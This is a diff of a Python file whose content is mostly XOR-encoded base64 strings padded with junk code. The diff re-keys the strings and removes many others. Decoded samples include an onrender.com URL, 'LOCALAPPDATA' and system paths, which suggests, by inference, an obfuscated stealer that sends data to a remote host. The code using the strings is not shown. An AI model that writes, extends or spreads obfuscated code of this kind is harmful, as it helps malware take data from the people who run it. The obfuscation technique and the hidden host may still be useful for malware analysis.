@@ -16,595 +16,632 @@ def _D(b):
     d = base64.b64decode(b)
     k = d[0]
     return bytes(c ^ k for c in d[1:]).decode("utf-8")
-_s1 = "Amp2dnJxOC0tcGNxcmpncGcsbWxwZ2xmZ3AsYW1v"
-_s2 = "SzkqODsjLjkuZignIi4lP2YgLjJmeXt5fw=="
-_s3 = "kqO8oryj"
-_s4 = "rt7XwN7b2g=="
-_s5 = "bh4XHgscDQIHHg=="
-_s6 = "YAMSGRAUDw=="
-_s7 = "E2NqfWNmZw=="
-_s8 = "EmJrcXNl"
-_s9 = "UCApIDUiMzw5IA=="
-_s10 = "v8/MysvW0w=="
-_s11 = "I1NaQlZHSkw="
-_s12 = "QyAxOjM3LA=="
-_s13 = "BUBXV0pXPyV1bHUlbGt2cWRpaSV1fHFtamsodmpmbmBxbGpeZmlsYGtxWA=="
-_s14 = "b0pHDhwMGwYCCkYcTzRKRwMKGQoDAQ4CCkYcMk9KRwIKHBwOCApGHA=="
-_s15 = "keHo/+Hk5Q=="
-_s16 = "5JONgJCM"
-_s17 = "/4iWkczN"
-_s18 = "hPfn9uHh6g=="
-_s19 = "5JeHloGBig=="
-_s20 = "IlFBUEdHTA=="
-_s21 = "Hml7fH1/cw=="
-_s22 = "x7Wiq6KmtKI="
-_s23 = "4pGBkIeHjA=="
-_s24 = "eQoaCxwcFw=="
-_s25 = "LW9qf3U="
-_s26 = "eDIoPT8="
-_s27 = "scLSw9TU3+7Xw9Dc1A=="
-_s28 = "b0EFHwg="
-_s29 = "2q2/uLm7t4W8qLu3vw=="
-_s30 = "QisvIyUn"
-_s31 = "A09qdWYjbmpgcWxza2xtZiNwd3FmYm5qbWQjdWpiI3N6YnZnamwj4YWRI1RCVSNga3ZtaHAj4YWRI2FicGY1Ny0="
-_s32 = "Pk5HX0taV1E="
-_s33 = "SSQgKhY6PSg9PDo="
-_s34 = "SCUhKxc7PCk8PTs="
-_s35 = "LkNHTXFdWk9aW10="
-_s36 = "XAsuPSx8Lj0rfAwfEXw1Mnw9fDE1MjUxPTB8Cx0KfDQ5PTg5LnwvM3w+LjMrLzkuL3w/PTJ8ODk/Mzg5fDUocg=="
-_s37 = "gLy088m087TzycjIycnIyLTzyQ=="
-_s38 = "PW90e3s="
-_s39 = "4oaDloM="
-_s40 = "mvfz+cX+++77"
-_s41 = "2amqrK2wtQ=="
-_s42 = "3a6krqm4sIKuqbyprg=="
-_s43 = "t9rS2tjFzujH0sXU0tnD"
-_s44 = "z6KqoqC9tpC7oLuuo5CorQ=="
-_s45 = "I0dKUEh8RVFGRnxEQQ=="
-_s46 = "9piTgqmFk5iCqZuU"
-_s47 = "4JOFjpOPkpM="
-_s48 = "YiEtLzEyJyE="
-_s49 = "juH+6+D++vc="
-_s50 = "wrGntrGrpg=="
-_s51 = "86e2ob4="
-_s52 = "bB8YCAUC"
-_s53 = "EGR1aGQ="
-_s54 = "M0RaXQAB"
-_s55 = "EWRldzwp"
-_s56 = "YRIVDhE="
-_s57 = "XSk4LzA0MzwxAjIoKS0oKQ=="
-_s58 = "KFtcR1g="
-_s59 = "0bSpuKXb"
-_s60 = "biwPDQUJHAEbAApOBQsXAgEJCQscThkHGgZOHgscQxkHAAoBGU4JHAEbHgcACU4PAApOHgscBwEKBw1OCAIbHQZA"
-_s61 = "5pafiJaTkg=="
-_s62 = "oMvF2czPx//T1MHU1dM="
-_s63 = "HnV7Z3JxeUFtan9qa20="
-_s64 = "kfr06P3+9s7i5fDl5OI="
-_s65 = "oNfJzpOS"
-_s66 = "guHq4/A="
-_s67 = "CGNtcWRnb1dsaXxp"
-_s68 = "fRMcEBg="
+_s1 = "OFBMTEhLAhcXSllLSFBdSl0WV1ZKXVZcXUoWW1dV"
+_s2 = "E2FyYGN7dmF2PnB/enZ9Zz54dmo+ISMhJw=="
+_s3 = "n66xr7Gu"
+_s4 = "keHo/+Hk5Q=="
+_s5 = "rd3U3cjfzsHE3Q=="
+_s6 = "YgEQGxIWDQ=="
+_s7 = "RjY/KDYzMg=="
+_s8 = "qdnQysje"
+_s9 = "lOTt5PHm9/j95A=="
+_s10 = "HGxvaWh1cA=="
+_s11 = "cQEIEAQVGB4="
+_s12 = "iun48/r+5Q=="
+_s13 = "mt/IyNXIoLrq8+q68/Tp7vv29rrq4+7y9fS36fX58f/u8/XB+fbz//Tuxw=="
+_s14 = "3/r3vqy8q7ayuvas/4T697O6qbqzsb6yuvasgv/697K6rKy+uLr2rA=="
+_s15 = "rNzVwtzZ2A=="
+_s16 = "36i2u6u3"
+_s17 = "YRYID1JT"
+_s18 = "5JeHloGBig=="
+_s19 = "ne7+7/j48w=="
+_s20 = "leb25/Dw+w=="
+_s21 = "8YaUk5KQnA=="
+_s22 = "lefw+fD05vA="
+_s23 = "ewgYCR4eFQ=="
+_s24 = "6JuLmo2Nhg=="
+_s25 = "UhAVAAo="
+_s26 = "WhAKHx0="
+_s27 = "E2BwYXZ2fUx1YXJ+dg=="
+_s28 = "jaPn/eo="
+_s29 = "gPfl4uPh7d/m8uHt5Q=="
+_s30 = "1r+7t7Gz"
+_s31 = "DEBlemksYWVvfmN8ZGNiaSx/eH5pbWFlYmssemVtLHx1bXloZWMs7oqeLFtNWixvZHliZ38s7oqeLG5tf2k6OCI="
+_s32 = "9oaPl4OSn5k="
+_s33 = "dhsfFSkFAhcCAwU="
+_s34 = "NVhcVmpGQVRBQEY="
+_s35 = "hejs5tr28eTx8PY="
+_s36 = "1IOmtaT0prWj9ISXmfS9uvS19Lm9ur25tbj0g5WC9LyxtbCxpvSnu/S2prujp7Gmp/S3tbr0sLG3u7Cx9L2g+g=="
+_s37 = "s4+HwPqHwIfA+vv7+vr7+4fA+g=="
+_s38 = "C1lCTU0="
+_s39 = "7YmMmYw="
+_s40 = "P1JWXGBbXkte"
+_s41 = "rd3e2NnEwQ=="
+_s42 = "v8zGzMva0uDMy97LzA=="
+_s43 = "27a+trSpooSrvqm4vrWv"
+_s44 = "st/X393Ay+3G3cbT3u3V0A=="
+_s45 = "rcnE3sbyy9/IyPLKzw=="
+_s46 = "CmRvflV5b2R+VWdo"
+_s47 = "tcbQ28bax8Y="
+_s48 = "t/T4+uTn8vQ="
+_s49 = "ttnG09jGws8="
+_s50 = "9oWTgoWfkg=="
+_s51 = "ThoLHAM="
+_s52 = "8YKFlZif"
+_s53 = "QTUkOTU="
+_s54 = "16C+ueTl"
+_s55 = "656fjcbT"
+_s56 = "yrm+pbo="
+_s57 = "3qq7rLO3sL+ygbGrqq6rqg=="
+_s58 = "8IOEn4A="
+_s59 = "G35jcm8R"
+_s60 = "+7mamJCciZSOlZ/bkJ6Cl5ScnJ6J24ySj5Pbi56J1oySlZ+UjNuciZSOi5KVnNualZ/bi56JkpSfkpjbnZeOiJPV"
+_s61 = "45OajZOWlw=="
+_s62 = "SyAuMickLBQ4Pyo/Pjg="
+_s63 = "WzA+Ijc0PAQoLzovLig="
+_s64 = "w6imuq+spJywt6K3trA="
+_s65 = "USY4P2Jj"
+_s66 = "KUpBSFs="
+_s67 = "zaaotKGiqpKprLms"
+_s68 = "hevk6OA="
 _xj = type("X", (), {"__init__": lambda s: None})()
 if _xj is not None and 1 == 2:
     del _xj
-_s69 = "vt3Oy+HO28zd29DK"
-_s70 = "UT8wPDQ="
-_s71 = "mPb37Lj+9+32/A=="
-_s72 = "KVlQSkhe"
-_s73 = "4ZeOjZSMhA=="
-_s74 = "n+/m/P7o"
-_s75 = "94eOlJaA"
-_s76 = "+Y6Ql8rL"
-_s77 = "pNzXwdA="
-_s78 = "BnFvaDU0"
-_s79 = "kPTx4uf5/g=="
-_s80 = "8d6iiIKFlJzevZiTg5CDiN6ynoOUopSDh5iSlILevJSfhNG0iYWDkILepIKUg9+clJ+E3rKen4WUn4WC3qOUgp6Eg5KUgt6ytqKUgoKYnp8="
-_s81 = "EHx/d3l+c2R8"
-_s82 = "9IOdmsfG"
-_s83 = "wqajsLWrrA=="
-_s84 = "ybmkuqy9"
-_s85 = "NUZMRkFQWFZBWQ=="
-_s86 = "E1B7cn10djN3dmB4Z3xjM2Ryf39jcmN2YTN1YXx+M398cHJ/M2NyZ3szfGEzRkFfPQ=="
-_s87 = "1LygoKTu+/s="
-_s88 = "1/m9p7A="
-_s89 = "05W6v7bzvbyn87W8pr23"
-_s90 = "p9DOyZSV"
-_s91 = "NWJUWVlFVEVQRxVWXVRbUlBR"
-_s92 = "vtrfzMnX0A=="
-_s93 = "JUpWRFZGV0xVUQ=="
-_s94 = "MWZQXV1BUEFUQxFSWVBfVlRV"
-_s95 = "LUpeSFlZRENKXg=="
-_s96 = "ZUhIBwJIFgYECQA="
-_s97 = "HEt9cHBsfWx5bjxveWg="
-_s98 = "is7PquTl/qr5//r65fj+7+4="
-_s99 = "Pm1WUUkeXx5OUU5LTh5TW01NX1lbHlxRRhA="
-_s100 = "dQIcG0ZH"
-_s101 = "SS0oOz4gJw=="
-_s102 = "t9jE1sTUxd7Hww=="
-_s103 = "LVdIQ0RZVA=="
-_s104 = "eygTFAwV"
-_s105 = "Rwg3IilnEhULZy4pZyMiISYyKzNnJTUoMDQiNWk="
+_s69 = "j+z/+tD/6v3s6uH7"
+_s70 = "kP7x/fU="
+_s71 = "xauqseWjqrCroQ=="
+_s72 = "rd3Uzsza"
+_s73 = "w7Wsr7aupg=="
+_s74 = "PExFX11L"
+_s75 = "fg4HHR8J"
+_s76 = "o9TKzZCR"
+_s77 = "75ecips="
+_s78 = "kOf5/qOi"
+_s79 = "E3dyYWR6fQ=="
+_s80 = "Mh1hS0FGV18dfltQQFNASx1xXUBXYVdARFtRV0Edf1dcRxJ3SkZAU0EdZ0FXQBxfV1xHHXFdXEZXXEZBHWBXQV1HQFFXQR1xdWFXQUFbXVw="
+_s81 = "5YmKgoyLhpGJ"
+_s82 = "USY4P2Jj"
+_s83 = "HHh9bmt1cg=="
+_s84 = "rNzB38nY"
+_s85 = "CnlzeX5vZ2l+Zg=="
+_s86 = "AkFqY2xlZyJmZ3Fpdm1yInVjbm5yY3JncCJkcG1vIm5tYWNuInJjdmoibXAiV1BOLA=="
+_s87 = "strGxsKInZ0="
+_s88 = "2fezqb4="
+_s89 = "8LaZnJXQnp+E0JafhZ6U"
+_s90 = "06S6veDh"
+_s91 = "N2BWW1tHVkdSRRdUX1ZZUFJT"
+_s92 = "1rK3pKG/uA=="
+_s93 = "OVZKWEpaS1BJTQ=="
+_s94 = "PWpcUVFNXE1YTx1eVVxTWlhZ"
+_s95 = "Gn1pf25uc3R9aQ=="
+_s96 = "6cTEi47EmoqIhYw="
+_s97 = "pPPFyMjUxdTB1oTXwdA="
+_s98 = "IGRlAE5PVABTVVBQT1JURUQ="
+_s99 = "zp2mobnur+6+ob67vu6jq729r6mr7qyhtuA="
+_s100 = "odbIz5KT"
+_s101 = "bgoPHBkHAA=="
+_s102 = "aAcbCRsLGgEYHA=="
+_s103 = "DnRrYGd6dw=="
+_s104 = "mcrx9u73"
+_s105 = "76CfioHPur2jz4aBz4uKiY6ag5vPjZ2AmJyKncE="
 _s106 = "vOjd19mc09LZnM/fztnZ0s/U08ic3dLYnM7ZyMnO0pzVyJI="
-_s107 = "bgMdHU4AARpODxgPBwIPDAIL"
-_s108 = "87G0oas="
-_s109 = "L2hKWw9OX19dQFdGQk5bSg9ISkBDQExOW0ZAQQ9ZRk4PZn8B"
-_s110 = "ehIODgoJQFVVEwpXGwoTVBkVF1UQCRUUVQ=="
-_s111 = "ut/IyNXI"
-_s112 = "J2tOVFMHTklUU0ZLS0JDB0ZXV0tOREZTTkhJVAk="
-_s113 = "u8zS1YiJ"
-_s114 = "YCQJExAMARkuAQ0F"
-_s115 = "5oKHlJGPiA=="
-_s116 = "pdbc1tHAyPrV18rDzMnA1w=="
-_s117 = "eBwIEx8="
-_s118 = "3Y2xvKT9vP2/uLit/a6yqLO5/fWKtLO5sqqu9PM="
-_s119 = "G2xydSgp"
-_s120 = "4qCHh5KHhg=="
-_s121 = "rt7P3sLP1w=="
-_s122 = "wJCsobmlpA=="
-_s123 = "mMv9+er78Lj+9+q4/vH0/eu49fns+/Dx9v+4+bjo+ezs/er2uLD8/ejs8LX08fXx7P38uP736rjr+f797OGxtg=="
-_s124 = "NXBNUFZAQVAVVBVGXVBZWRVWWlhYVFtRFVRbURVHUEFAR1sVWkBBRUBBGw=="
-_s125 = "/Ki1sbmzqag="
-_s126 = "UhA+PTE5fSc8MD49MTlyPz0nITdyMzw2cjk3KzA9MyA2cjs8IicmcnoFOzw2PSUhcj08Pit+ciA3Iyc7IDchcjM2Pzs8e3w="
-_s127 = "AnVrbDEw"
-_s128 = "ImtMUldWAkBOTUFJR0Y="
-_s129 = "0ZO9vrK68bewuL20tfH5v7S0taLxsLW8uL/4"
-_s130 = "kMT1/P715A=="
-_s131 = "oen19fE="
-_s132 = "vPTo6Ozv"
-_s133 = "QQw4EhAN"
-_s134 = "OmhfXlNJ"
-_s135 = "eTQWFx4WPTs="
-_s136 = "7Lm8grw="
-_s137 = "P2xse28="
-_s138 = "hsXu9Onr4+Xn9fI="
-_s139 = "4qHS2NfU2NDV"
-_s140 = "JxcXHRYWHRQV"
-_s141 = "IhFhGBcQGBoQ"
-_s142 = "RQd9f3dyfwAH"
-_s143 = "h8azvb+0vcKw"
-_s144 = "gbPCu8exu7TF"
-_s145 = "GCkgIlosIiso"
-_s146 = "XGQdZm8aZm0f"
-_s147 = "1u/i7OPh7OSV"
-_s148 = "Tn5+dH8PdH9/"
-_s149 = "bFxcVllcVlla"
-_s150 = "SHh4cnkKcnx8"
-_s151 = "rp6elJ/qlJnr"
-_s152 = "9cPFz8HAz7ex"
-_s153 = "OAgIAgh7AgoB"
-_s154 = "VxUUbW5lbWEV"
-_s155 = "ibm5s7jLs7+6"
-_s156 = "yIz48oz48vj7"
-_s157 = "xPX8/vby/vD9"
-_s158 = "md+ho62vo6ja"
-_s159 = "3uyd5Ovq5Ofv"
-_s160 = "e0tLQUlPQTk+"
-_s161 = "ATExOzA1O0dF"
-_s162 = "OQkJAwh8A3oL"
-_s163 = "CUplaHp6YG9wKWgpZGhqYWBnbCl9cHlsKWtoemxtKWZnKWB9eilmeWxnKXlme316KWhnbSlmfWFseylqZXxseic="
-_s164 = "rN7D2djJ3g=="
-_s165 = "84OBmp2HloE="
-_ji = 0
-for _ in [1,2,3]:
-    if False: _ji += 1
-_s166 = "SiYjJD8yFTkvODwvOA=="
-_s167 = "kf34/+TpzuL04+f04w=="
-_s168 = "6J+BhoyHn5u3mIs="
-_s169 = "z7y2oaCjoKi2"
-_s170 = "2ZeYivn2+Z+wtbz5iryrr7yr"
-_s171 = "SD8hJiwnPzsXOy06Pi06"
-_s172 = "o9TKzcfM1ND808A="
-_s173 = "USY4PzU+JiIOITI="
-_s174 = "+5+aj5qZmoie"
-_s175 = "ah4aRwYDBAE="
-_s176 = "BXdqcHFgdw=="
-_s177 = "BnFjZFl1Y3RwY3Q="
-_s178 = "vPXT6JyTnPHZ2NXdnPjZytXf2Q=="
-_s179 = "/ZyNjZGY"
-_s180 = "6IWHioGEjQ=="
-_s181 = "bgkBAQkCCw=="
-_s182 = "u+jW2snPm/PU1t6b/97N0tje"
-_s183 = "TD4tPzwuKT4+NQ=="
-_s184 = "4IyJjpWYv5OFkpaFkg=="
-_s185 = "jv3h4Pc="
-_s186 = "OGtVWUpMGGxuGBcYdV1cUVk="
-_s187 = "w6GxrLerprE="
-_s188 = "bBweBQIYCR4="
-_s189 = "VyI5PDk4IDk="
-_s190 = "OmtPU1lRGm55ahpZVVRUX1lOGklZW1QaVVQaWxpWU0lOGlVcGkpVSE5JFBpoX05PSFRJGlZTSU4aVVwaVUpfVBpKVUhOSRQ="
-_s191 = "uv3fzprU387N1cjRmtPUzt/I3NvZ38mWmtvZztPM35rZ1dTU39nO09XUyZaa++jqms7b2Nbflprb1N6aytXIzpfJ2dvUmsjfyc/WzsmU"
-_s192 = "fRQTCRgPGxweGA4="
-_s193 = "PU1OSElUUQ=="
-_s194 = "74GOgoo="
-_s195 = "ju/q6vzr/f3r/Q=="
-_s196 = "M1VSXlpfSg=="
-_s197 = "8ZCVlYOUgoI="
-_s198 = "xqijsqunta0="
-_s199 = "QSMzLiAlIiAyNQ=="
-_s200 = "44qNl4aRhYKAhpA="
-_s201 = "u9LVz97J3drY3sjk3snJ1Mk="
-_s202 = "/IyPiYiVkA=="
-_s203 = "2rm1tLS/ua6ztbSp"
-_s204 = "nPr98fXw5Q=="
-_s205 = "VSEsJTA="
-_s206 = "cx8cEBIf"
-_s207 = "AnBnb212Zw=="
-_s208 = "cQIFEAUEAg=="
-_s209 = "UTI+Pz80MiU4Pj8iDjQjIz4j"
-_s210 = "dAMdGkdG"
-_s211 = "HGt1ci8u"
-_s212 = "w6e6raKuqqA="
-_s213 = "M1dKXVJeWkJGVg=="
-_s214 = "I1daU0Y="
-_s215 = "17alp4iypaW4pQ=="
-_s216 = "kaOjpb8="
-_s217 = "E0Z9eH18ZH0="
-_s218 = "YzYNCA0MFA0="
-_s219 = "os7NwcPO/czH1tXN0Mk="
-_s220 = "3Kq5srizrg=="
-_s221 = "gu3y5+zd8u3w9vE="
-_s222 = "aQYZDAc2GgwbHwAKDBo="
-_s223 = "JElFR0xNSkF7UF1UQQ=="
-_s224 = "NVhUVl1cW1BqWVRXUFk="
-_s225 = "dRgUFh0cGxAqHBYaGw=="
-_s226 = "OVhLSWZNQElc"
-_s227 = "iObt/P/n+uM="
-_s228 = "XzwwMTE6PCs2MDEs"
-_s229 = "x7Wiqqizog=="
-_s230 = "oJGSl44="
-_s231 = "b15YXUE="
-_s232 = "u4uVi5WLlYs="
-_s233 = "fBkECBkOEh0QIxQTDwgP"
-_s234 = "K1tEWV8="
-_s235 = "MkFXQERbUVc="
-_s236 = "5pWSh5KTlQ=="
-_s237 = "tNjb19XY69XQ0MY="
-_s238 = "s93Wx8Tcwdg="
-_s239 = "VjMuIjMkODc6CT45JSIl"
-_s240 = "i+rn59T75Pn/+A=="
-_s241 = "geDt7d7x7vP18g=="
-_s242 = "YQQZFQQTDwANPgkOEhUS"
-_s243 = "stfKxtfA3NPe7drdwcbB"
-_s244 = "pc3K1tHLxMjA"
-_s245 = "jv7h/Po="
-_s246 = "6pqFmJ4="
-_s247 = "DUh1eX9sbnktfmx7aGktfWx+fnpif2l+LWxjaS1uYmJmZGh+LWt/YmAtTmV/YmBoIS1IaWpoIS1LZH9oa2J1Iw=="
-_s248 = "qcrB28bEzA=="
-_s249 = "8r69sbO+s6KitrOmsw=="
-_s250 = "+bipqb24rbg="
-_s251 = "Wh01NT02Pw=="
-_s252 = "RSYtNyooIA=="
-_s253 = "ZQYNFwoIAA=="
-_s254 = "q+bCyNnE2MTN3w=="
-_s255 = "AWRlZmQ="
-_s256 = "zKmoq6k="
-_s257 = "BElrfm1oaGU="
-_s258 = "dBIdBhESGww="
-_s259 = "8pSbgJeUnYo="
-_s260 = "dDEMAAYVFwBUBBUHBwMbBhAHVBIGGxlUNxwGGxkdARlZFhUHERBUFgYbAwcRBgdUXDccBhsZEVhUMRATEVhUNgYVAhFYVDsEEQYVWlpaXVo="
-_s261 = "16e2pKSguKWzpA=="
-_s262 = "ldHw8/Tg+eE="
-try:
-    raise Exception()
-except:
-    pass
-_s263 = "97uYkJ6Z17OWg5Y="
-_s264 = "NWFweGU="
-_s265 = "hNfByMHH0KTr9u3j7erb8fboqKTx9+H26uXp4dvy5ejx4aik9OX39/Pr9uDb8uXo8eGkwtbLyaTo6+Pt6vc="
-_s266 = "mPvq4ejs9w=="
-_s267 = "1KS1p6eju6awpw=="
-_s268 = "P1pNTVBN"
-_s269 = "mNb97O/36vM="
-_s270 = "QQIuLiooJDI="
-_s271 = "bTkoID0="
-_s272 = "t+Ty+/L045ff2MTD6NzSzpuX2dba0puX0tnUxc7Hw9LT6MHW28LSl/Hl+PqX1NjY3N7SxJf7/vr+45eFh4c="
-_s273 = "RCcrKy8tITc="
-_s274 = "VzIlJTgl"
-_s275 = "ntr7/ezn7uq+3fbs8fP7sdv6+fu+7v/t7enx7Pq+6+338Pm+yffw+vHp7b7azt/O1761vt/bzbOsq6iz2d3TsA=="
-_s276 = "A1htbCNnYndiXg=="
-_s277 = "DlV6YWEufWZhfHpT"
-_s278 = "p/zSyczJyNDJh8HI1crG04c="
-_s279 = "IGxvY2FsYXBwZGF0YQ=="
-_s280 = "8rWdnZWelw=="
-_s281 = "o+7KwNHM0MzF1w=="
-_s282 = "Swk5Kj0uGCQtPzwqOS4="
-_s283 = "tfrF0MfUleba08HC1MfQ"
-_s284 = "h8vo5Obrp9Tz5vPi"
-_s285 = "KVxdTwQR"
-_s286 = "DGN/U29+dXx4"
-_s287 = "l9PH1sfe"
-_s288 = "rs3M6s/azw=="
-_s289 = "dgYUMhcCFw=="
-_s290 = "cwYHFV5L"
-_s291 = "2IO7uba2t6z4vL27qqGorIU="
-_s292 = "pOHc0NbFx9CE18XSwcCEyMvDzcrXhMLWy8mE4s3WwcLL3ITU1svCzcjB14o="
-_s293 = "QTEgMjI2LjMlMg=="
-_s294 = "Ml5dVVtcQRxYQV1c"
-_s295 = "vMnI2pGE"
-_s296 = "henq4uzr9g=="
-_s297 = "g/Pi8PD07PHn8A=="
-_s298 = "17+4pKO5trqy"
-_s299 = "p9LUwtXJxsrC"
-_s300 = "g/Pi8PD07PHn"
-_s301 = "hvb06eDv6uM="
-_s302 = "5IGKh5adlJCBgA=="
-_s303 = "8JOfn5uZlYPeg4GcmYSV"
-_s304 = "teHw+OU="
-_s305 = "FUZQWVBWQTV9emZhOTV7dHhwOTVjdHlgcDVTR1pYNXh6b0p2enp+fHBmNVlcWFxBNSclJQ=="
-_s306 = "L0xAQERGSlw="
-_s307 = "qcHG2t0="
-_s308 = "1qC3uqOz"
-_s309 = "RCE2Nis2"
-_s310 = "aCwHHwYEBwkMSAlIDgEEDUgOGgcFSD06JEgJBgxIBxgcAQcGCQQEEUgNEA0LHRwNSAEcRg=="
-_s311 = "lcHQ2MU="
-_s312 = "MkVbXAEA"
-_s313 = "SzwiJXh5"
-_s314 = "FGR1YHw="
-_s315 = "fhAfExs="
-_s316 = "xKG2tqu2"
-_s317 = "I0ZRUUxR"
-_s318 = "mPb59f0="
-_s319 = "us7Dyt8="
-_s320 = "bwIACwYJBgoL"
-_s321 = "pcvEyMA="
-_s322 = "h/P+9+I="
-_s323 = "u8vaz9M="
-_s324 = "jfrs/+Pk4+o="
-_s325 = "xYuqseWjqrCroQ=="
-_s326 = "kNT1/PXk9fQ="
-_s327 = "nfn86fw="
-_s328 = "sdTDw97D"
-_s329 = "lNf88ff/tOfx5uLx5rTy++a09bT68eO09/j98frgtOLx5uf9+/q6tMbx4OHm+ue0vPrx48vi8ebn/fv6uLTw++P6+Pv18Mvh5vi9tPvmtLza+/rxuLTa+/rxvbo="
-_s330 = "+daYiZDWmpWQnJeN1IyJnZiNnA=="
-_s331 = "KF5NWltBR0Y="
-_s332 = "eh4VDRQWFRseJQ8IFg=="
-_s333 = "kN7/sOXg9PHk9bD5/vb/sPP//vb59+Xi9fSw//6w4/Xi5vXi"
-_s334 = "8LSfh56cn5GU0ISYldCelYfQ3pWIldCRnpTQg4SRl5XQkdCSkYSTmNCDk4KZgITQhJ/QgpWAnJGTlduClYOEkYKE3g=="
-_s335 = "L3tqYn8="
-_s336 = "fVgDG00="
-_s337 = "I1RKTRAR"
-_s338 = "it/67uv+76r56fjj+v6q5uv/5Oni7+6qp6rv8uP+4+Ttqv7lquv6+ubzqv/67uv+7w=="
-_s339 = "QQA0NS5sNDElIDUkYSgyYRYoLyUuNjJsLi8tOGEnLjNhLy42"
-_s340 = "qerBzMrCicDPidvcx8fAx86J3sDdwYnIzcTAx4nZ28DfwMXMzszaiYH+wMfNxt7aicbHxdCAhw=="
-_s341 = "NUJcWwYH"
-_s342 = "u8zS1YiJ"
-_s343 = "+q+7udqYg4qbiYnak4narZOUnpWNideVlJaD"
-_s344 = "WC8xNio9P3g2Nyx4OS45MTQ5OjQ9eD43KngNGRt4OiEoOSsr"
-_s345 = "99rakpuSgZaDkpM="
-_s346 = "r4KC3Mrd2crd"
-_s347 = "WXR0PDU8LzgtPD0="
-_s348 = "YycGDwYEAhcGJhsGABYXBg=="
-_s349 = "RAAhKCEjJTAhATwhJzEwIQ=="
-_s350 = "NmF/eHJ/ZA=="
-_s351 = "LXhsbg1PVF1MXl4NWV9ESkpIX0hJDQANSFVEWURDSg1OWF9fSENZDURDXllMQ05I"
-_s352 = "xJahqauyoeSiq6Csoai0obbktqGjrbewtr3kr6G9t+SooaKw5Ka95LCsoeSmvbSlt7fq"
-_s353 = "wYWkraSmoLWkhLmkorS1pA=="
-_s354 = "ms/b2bro//3z6e7o47r59v/79P/+uu/q"
-_s355 = "RBQhNi0rIC0nJSgoPWQ0LSojZDAsIWQ3ITYyITZkLCElKDAsZCEqIDQrLSowZDArZDQ2ITIhKjBkFiEqICE2ZCI2KylkNyghITQtKiNq"
-_s356 = "u5Tay9KU097a18/T"
-_s357 = "qeLMzNmEyMXA38yJ2cDHzonm4g=="
-_s358 = "2b+rtqO8tw=="
-_s359 = "h/Du6bS1"
+_s107 = "VjslJXY4OSJ2NyA3Pzo3NDoz"
+_s108 = "w4GEkZs="
+_s109 = "3Zq4qf28ra2vsqW0sLypuP26uLKxsr68qbSys/2rtLz9lI3z"
+_s110 = "yaG9vbm68+bmoLnkqLmg56qmpOajuqan5g=="
+_s111 = "NVBHR1pH"
+_s112 = "9rqfhYLWn5iFgpeampOS1peGhpqflZeCn5mYhdg="
+_s113 = "ptHPyJWU"
+_s114 = "5KCNl5SIhZ2qhYmB"
+_s115 = "9JCVhoOdmg=="
+_s116 = "wLO5s7SlrZ+wsq+mqaylsg=="
+_s117 = "mv7q8f0="
+_s118 = "NWVZVEwVVBVXUFBFFUZaQFtRFR1iXFtRWkJGHBs="
+_s119 = "ZhEPCFVU"
+_s120 = "0JK1taC1tA=="
+_s121 = "KFhJWERJUQ=="
+_s122 = "D19jbnZqaw=="
+_s123 = "FEdxdWZ3fDRye2Y0cn14cWc0eXVgd3x9enM0dTRkdWBgcWZ6NDxwcWRgfDl4fXl9YHFwNHJ7ZjRndXJxYG09Og=="
+_s124 = "cTQJFBIEBRRREFECGRQdHVESHhwcEB8VURAfFVEDFAUEAx9RHgQFAQQFXw=="
+_s125 = "ZjIvKyMpMzI="
+_s126 = "eDoUFxsTVw0WGhQXGxNYFRcNCx1YGRYcWBMdARoXGQocWBEWCA0MWFAvERYcFw8LWBcWFAFUWAodCQ0RCh0LWBkcFREWUVY="
+_s127 = "Kl1DRBkY"
+_s128 = "IWhPUVRVAUNNTkJKREU="
+_s129 = "WRs1NjoyeT84MDU8PXlxNzw8PSp5OD00MDdw"
+_s130 = "bjoLAgALGg=="
+_s131 = "Yio2NjI="
+_s132 = "MXllZWFi"
+_s133 = "qOXR+/nk"
+_s134 = "E0F2d3pg"
+_s135 = "LmNBQElBamw="
+_s136 = "JnN2SHY="
+_s137 = "uOvr/Og="
+_s138 = "P3xXTVBSWlxeTEs="
+_s139 = "qeqZk5yfk5ue"
+_s140 = "v4+PhY6OhYyN"
+_s141 = "3O+f5unu5uTu"
+_s142 = "5afd39fS36Cn"
+_s143 = "O3oPAQMIAX4M"
+_s144 = "xPaH/oL0/vGA"
+_s145 = "TXx1dw95d359"
+_s146 = "naXcp67bp6ze"
+_s147 = "fEVIRklLRk4/"
+_s148 = "zf399/yM9/z8"
+_s149 = "vIyMhomMhomK"
+_s150 = "Dz8/NT5NNTs7"
+_s151 = "OwsLAQp/AQx+"
+_s152 = "uY+Jg42Mg/v9"
+_s153 = "YFBQWlAjWlJZ"
+_s154 = "Xx0cZWZtZWkd"
+_s155 = "88PDycKxycXA"
+_s156 = "fDhMRjhMRkxP"
+_s157 = "/czFx8/Lx8nE"
+_s158 = "cTdJS0VHS0Ay"
+_s159 = "rZ/ul5iZl5Sc"
+_s160 = "6dnZ09vd06us"
+_s161 = "qZmZk5idk+/t"
+_s162 = "KRkZExhsE2ob"
+_s163 = "VhU6NyUlPzAvdjd2Ozc1Pj84M3YiLyYzdjQ3JTMydjk4dj8iJXY5JjM4diY5JCIldjc4MnY5Ij4zJHY1OiMzJXg="
+_s164 = "MkBdR0ZXQA=="
+_s165 = "aBgaAQYcDRo="
 if False:
     _x = [i for i in range(1000) if i % 7 == 0]
     _y = "".join(chr(c) for c in range(65, 91))
-_s360 = "Dk9eXkpPWk8="
-_s361 = "DSNsYGx3YmNgeH5kbg=="
-_s362 = "C3UkJWpmanFkZWZ+eGJo"
-_s363 = "4aCMgJuOj6yUkoiCqYSNkYSTz4SZhA=="
-_s364 = "s56ewNbBxdbB"
-_s365 = "BCkpbWA="
-_s366 = "BHNtajc2"
-_s367 = "C0pmanFkZUZ+eGJoQ25ne255"
-_s368 = "EVBBQVVQRVA="
-_s369 = "ufjU2MPW1/TMytDa8dzVydzLl8/byg=="
-_s370 = "A0ptcHdib29mZzkjUHdicXd2cyNVQVA="
-_s371 = "XC8/NCg9Lzcv"
-_s372 = "z7ysp7uuvKS8"
-_s373 = "yIGmu7yppKStrPLonKm7ow=="
-_s374 = "utnI1dTO29g="
-_s375 = "v/7S3sXQ0fLKzNbc99rTz9rN"
-_s376 = "GXprdndteHs="
-_s377 = "K2JFWF9KR0dOTxELSFlERV9KSQ=="
-_s378 = "WCZ3djs3Nj4xP3crISssPTU8dy0rPSo="
-_s379 = "MlNfU0hdXF9HQVtRH1pXXkJXQBxBV0BEW1FX"
-_s380 = "9YaMhoGQmJaBmQ=="
-_s381 = "XC8lLyg5MT8oMA=="
-_s382 = "LmdAXVpPQkJLShQOXVddWktDSg=="
-_s383 = "aR4AB1pb"
